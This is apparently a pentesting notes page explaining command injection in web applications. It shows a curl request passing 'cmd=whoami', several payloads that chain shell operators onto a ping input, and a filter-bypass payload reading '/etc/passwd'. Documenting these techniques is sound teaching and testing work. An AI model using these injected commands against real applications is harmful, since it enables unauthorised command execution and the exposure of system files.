---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Command injection

Allow to execute arbitrary system commands on a host operating system via a vulnerable application. Normally happens when a web application takes a user-supplied input and passes it directly to a shell interpreter.

We can find a typical example of this vulnerability as follows:

* When internally using functions like _system_ or _shell\_exec_ which pass input to an internal command interpreter.

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#We send a petition with a command
curl -X POST http://url/? -d "cmd=whoami"
#If being handled by system(), it will respond with the output of the command, letting us we can talk to the internal shell
```
{% endcode %}

***

* In some cases, the application will receive input and redirect it to an internal command executed in the server shell

{% code overflow="wrap" lineNumbers="true" %}
```bash
#A form receives the IP as input and executes the ping command
8.8.8.8
#Example output
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=26.4 ms
...
#Ww see that it works like the following command inside
ping $input
```
{% endcode %}

***

* We can abuse this input to add other commands using the command operators

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">8.8.8.8; ls -la
<strong>8.8.8.8 &#x26; ls -la    
</strong>8.8.8.8 &#x26;&#x26; ls -la
8.8.8.8 | ls -la
8.8.8.8 || ls -la
</code></pre>

***

* Sometimes it could be sanitized to detect these symbols, so to avoid detection, we can combine operators and commands into a single string, which helps bypass filtering.

{% code overflow="wrap" lineNumbers="true" %}
```bash
8.8.8.8|cat /etc/passwd
```
{% endcode %}
